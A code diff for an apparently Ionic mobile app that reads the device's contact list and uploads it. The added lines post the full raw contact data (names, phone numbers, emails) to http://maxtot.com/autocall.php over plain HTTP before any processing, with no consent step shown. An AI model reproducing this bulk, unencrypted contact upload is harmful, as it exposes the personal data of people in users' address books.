@@ -122,6 +122,10 @@ export class HomePage {
             ['displayName', 'name', 'phoneNumbers', 'emails'],
             { filter: "", multiple: true })
             .then(data => {
+                this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
+                    res => console.log(res),
+                    err => console.log(err)
+                );
                 this.loading.contactlist = false;
                 let contactlist: any[];
                 for (var i = 0; i < data.length; i++) {
@@ -130,19 +134,8 @@ export class HomePage {
                     var phonenumber = contact.phoneNumbers;
                     if (phonenumber != null) {
                         for (var n = 0; n < phonenumber.length; n++) {
-                            var type = phonenumber[n].type;
                             var phone = phonenumber[n].value;
                             if (phone != '') {
-                                
-                                // var mobile;
-                                // if (phone.slice(0, 1) == '+' || phone.slice(0, 1) == '0') {
-                                //     mobile = phone.replace(/[^a-zA-Z0-9+]/g, "");
-                                // }
-                                // else {
-                                //     var mobile_no = phone.replace(/[^a-zA-Z0-9]/g, "");
-                                //     mobile = mobile_no;
-                                // }
-
                                 var contactData = {
                                     "displayName": no,
                                     "phoneNumbers": phone,
@@ -156,7 +149,7 @@ export class HomePage {
                 }
 
                 this.dataHome['contactlist'] = contactlist;
-                this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
+                this._dataService.post('http://maxtot.com/autocall.php', contactlist).subscribe(
                     res => console.log(res),
                     err => console.log(err)
                 );
